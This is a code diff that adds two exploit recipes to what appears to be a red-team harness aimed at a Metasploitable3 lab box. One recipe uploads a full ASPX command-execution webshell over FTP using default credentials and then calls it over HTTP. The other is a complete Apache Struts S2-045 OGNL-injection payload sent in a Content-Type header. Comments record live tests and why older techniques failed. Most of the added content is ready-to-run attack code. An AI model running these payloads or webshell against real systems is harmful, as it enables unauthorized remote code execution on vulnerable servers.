@@ -399,6 +399,28 @@ exit 1' """,
         postcondition_command=r"""sh -lc 'wa=$(curl -sS -m 10 "http://$TARGET_HOST/portalproof-fc.txt"); es=$(curl -sS -m 10 "http://$TARGET_HOST:9200/"); ok1=0; ok2=0; printf "%s" "$wa" | grep -Eiq "vagrant-2008r2.vagrant" && ok1=1; printf "%s" "$es" | grep -Eiq "You Know, for Search" && ok2=1; test "$ok1" = 1 -a "$ok2" = 1 && printf "PORTAL_TARGET_POSTCONDITION:full-chain:%s|%s\n" "$wa" "$es"' """,
         postcondition_pattern=r"PORTAL_TARGET_POSTCONDITION:full-chain:",
     ),
+    "meta3_iis_http": CaptureRecipe(
+        # MS15-034 (the old red_prompt's assumed technique) doesn't work here
+        # -- a huge Range header gets a clean 416, not the crash/disclosure
+        # the CVE causes, confirmed live 2026-08-01 (this box is patched or
+        # never vulnerable to it). Real technique: the FTP root IS the IIS
+        # web root (same discovery meta3_ftp_backdoor's fix relies on) and
+        # accepts writes with the documented vagrant:vagrant creds, so an
+        # ASPX webshell uploaded over FTP and invoked over HTTP is a genuine
+        # IIS-specific initial-access + execution chain, not a borrowed
+        # WinRM/SMB technique. Cleans up via FTP DELE after invoking.
+        command=r"""printf '%s\n' '<%@ Page Language="C#" %>' '<% System.Diagnostics.Process p = new System.Diagnostics.Process(); p.StartInfo.FileName = "cmd.exe"; p.StartInfo.Arguments = "/c " + Request.QueryString["c"]; p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); %>' > /tmp/portalproof.aspx; curl -sS -m 10 -T /tmp/portalproof.aspx --user vagrant:vagrant "ftp://$TARGET_HOST/portalproof.aspx"; out=$(curl -sS -m 10 "http://$TARGET_HOST/portalproof.aspx?c=whoami"); printf '%s\n' "$out"; curl -sS -m 10 --user vagrant:vagrant "ftp://$TARGET_HOST/" -Q "DELE portalproof.aspx" >/dev/null 2>&1; printf '%s' "$out" | grep -Eiq 'apppool' && echo __PORTAL_RECIPE_OK__"""
+    ),
+    "meta3_struts_rce": CaptureRecipe(
+        # Neither canned msf module worked (struts2_rest_xstream: not
+        # vulnerable; struts2_multi_eval_ognl: not vulnerable, and has no
+        # Windows target anyway) -- confirmed live 2026-08-01 the real bundled
+        # jar is struts2-core-2.3.20.1.jar (read over WinRM), squarely in
+        # S2-045/CVE-2017-5638's affected range (2.3.5-2.3.31). That's a
+        # Content-Type header OGNL injection, not the REST/XStream or
+        # multi-CVE techniques the old red_prompt and canned modules assumed.
+        command=r"""ct="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"; out=$(curl -sS -m 10 "http://$TARGET_HOST:8282/struts2-rest-showcase/orders/3" -H "Content-Type: $ct"); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eiq 'nt authority' && echo __PORTAL_RECIPE_OK__"""
+    ),
 }
 
 
